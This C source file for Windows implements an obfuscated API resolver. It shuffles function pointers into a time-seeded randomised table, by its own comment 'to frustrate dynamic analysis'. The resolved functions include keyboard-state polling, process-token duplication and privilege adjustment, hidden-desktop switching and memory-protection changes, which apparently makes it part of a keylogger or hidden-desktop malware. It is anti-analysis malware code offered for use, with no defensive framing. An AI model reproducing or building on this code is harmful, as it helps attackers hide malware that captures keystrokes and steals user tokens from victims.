#include <Windows.h>
#include <TlHelp32.h>

PVOID ApiResolverAPIs[] = {
    &RegisterClassExA,
    &CreateWindowExA,
    &DispatchMessageA,
    &TranslateMessage,
    &GetMessageA,
    &AdjustTokenPrivileges,
    &GetModuleFileNameA,
    &Process32Next,
    &Process32First,
    &SetThreadDesktop,
    &CreateProcessWithTokenW,
    &DuplicateTokenEx,
    &OpenProcess,
    &CreateToolhelp32Snapshot,
    &GetKeyNameTextW,
    &memcpy,
    &CloseHandle,
    &CreateFileMappingA,
    &FreeLibrary,
    &CreateFileMappingW,
    &MapViewOfFile,
    &GetKeyboardState,
    &GetKeyState,
    &RegisterClassExW,
    &GetAsyncKeyState,
    &OpenDesktopA,
    &GetCurrentProcess,
    &OpenProcessToken,
    &GetUserNameA,
    &VirtualProtect,
    &VirtualAlloc,
    &LoadLibraryA,
    &GetProcAddress,
    &LookupPrivilegeValueA
};

// This include MUST be below the ApiResolverAPIs array
// If its not, the #defines will mess up
#include "apiresolver.h"

unsigned int ApiResolverCounter = 0;    // This is used to not get array accesses optimized away into a single value.
unsigned int ApiResolverSeed = 0;       // We are using rand() deterministically, so save the seed(). Not for crypto, its fine to use time()

// Initializes the apiresolverstruct. This becomes a map of value ->      offset       -> function address.
//                                                           API  -> apiresolverstruct ->  ApiResolverAPIs
void InitApiResolver(void)
{
    ApiResolverSeed = time(NULL);
    srand(ApiResolverSeed);

    // This delta is very important. It randomizes the array order in memory to frustrate dynamic analysis.
    // For example, LoadLibraryA can be found at apiresolverstruct[0] depending on this delta.
    unsigned int delta  = rand()%(sizeof(apiresolverstruct)/sizeof(UINT));
    size_t real_size    = sizeof(apiresolverstruct)/sizeof(UINT);
    unsigned int offset = rand()%512;
    
    for (size_t i = 0; i < real_size; i++)
    {
        // printf("[%zu + %u] addr: %p = %u (offset)\n", i, delta, &((UINT*)&apiresolverstruct)[(i+delta)%real_size], offset);
        ((UINT*)&apiresolverstruct)[(i+delta)%real_size] = offset;
        offset += 1 + rand()%512;
    }
}

// This turns the value API back into an offset into apiresolverstruct, which gets the actual function address
PVOID ApiResolver(unsigned int API)
{
    srand(ApiResolverSeed);
    unsigned int delta = rand()%(sizeof(apiresolverstruct)/sizeof(UINT));
    size_t real_size = sizeof(apiresolverstruct)/sizeof(UINT);
    for (size_t i = 0; i < real_size; i++)
    {
        // printf("API: %lu, Other: %lu\n", API, ((UINT*)&apiresolverstruct)[(i+delta)%real_size]);
        if (API == ((UINT*)&apiresolverstruct)[(i+delta)%real_size])
        {
            UINT offset = (UINT)floor(((i+delta)%real_size)/APILENGTH)*sizeof(char*);
            PVOID* ret = (PVOID)((char*)ApiResolverAPIs + offset);
            return *ret;
        }
    }
    return NULL;
}